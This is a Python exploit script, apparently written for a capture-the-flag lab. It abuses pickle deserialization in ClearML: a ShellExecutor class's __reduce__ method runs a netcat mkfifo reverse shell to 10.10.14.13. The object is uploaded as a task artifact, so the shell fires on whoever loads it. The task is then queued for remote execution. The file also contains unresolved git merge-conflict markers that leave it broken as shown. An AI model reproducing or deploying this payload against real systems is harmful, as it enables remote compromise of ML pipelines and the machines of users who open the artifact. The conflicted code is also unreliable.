import os
import subprocess
from clearml import Task

# Define a class that exploits deserialization vulnerability
class ShellExecutor:
    # The __reduce__ method is used for object serialization
    def __reduce__(self):
        # Define a command to create a reverse shell
<<<<<<< HEAD
<<<<<<< HEAD
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv 10.10.14.13 4949 >/tmp/f"
=======
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 5245 >/tmp/f"
>>>>>>> 6804776 (Initial commit)
=======
        cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -nv 10.10.14.13 4949 >/tmp/f"
>>>>>>> 64624d9 (Update pklartifact.py with new reverse shell command and task details)
        # Return the subprocess.call function and the command as arguments
        return (subprocess.call, (cmd,))

# Instantiate the class, setting up for the exploit
shell_executor = ShellExecutor()

# Initialize a ClearML task
task = Task.init(
<<<<<<< HEAD
<<<<<<< HEAD
    project_name="Black Swan",    # Name of the ClearML project
    task_name="dravenTask3",  # Name of the specific task
=======
    project_name="draven",    # Name of the ClearML project
    task_name="dravenTask2",  # Name of the specific task
>>>>>>> 6804776 (Initial commit)
=======
    project_name="Black Swan",    # Name of the ClearML project
    task_name="dravenTask3",  # Name of the specific task
>>>>>>> 64624d9 (Update pklartifact.py with new reverse shell command and task details)
    tags=["review"],              # Tags associated with the task for categorization
    task_type=Task.TaskTypes.data_processing,  # Type of the task, in this case, data processing
    output_uri=True               # Output URI is set to True
)

# Upload an artifact associated with the task
task.upload_artifact(
    name="dravenArtifact",   # Name of the artifact
    artifact_object=shell_executor, # Artifact object, in this case, the instance of ShellExecutor
    retries=2,                    # Number of retries for the upload
    wait_on_upload=True           # Whether to wait for the upload to complete
)

# Execute the task remotely on a specified queue
task.execute_remotely(queue_name='default')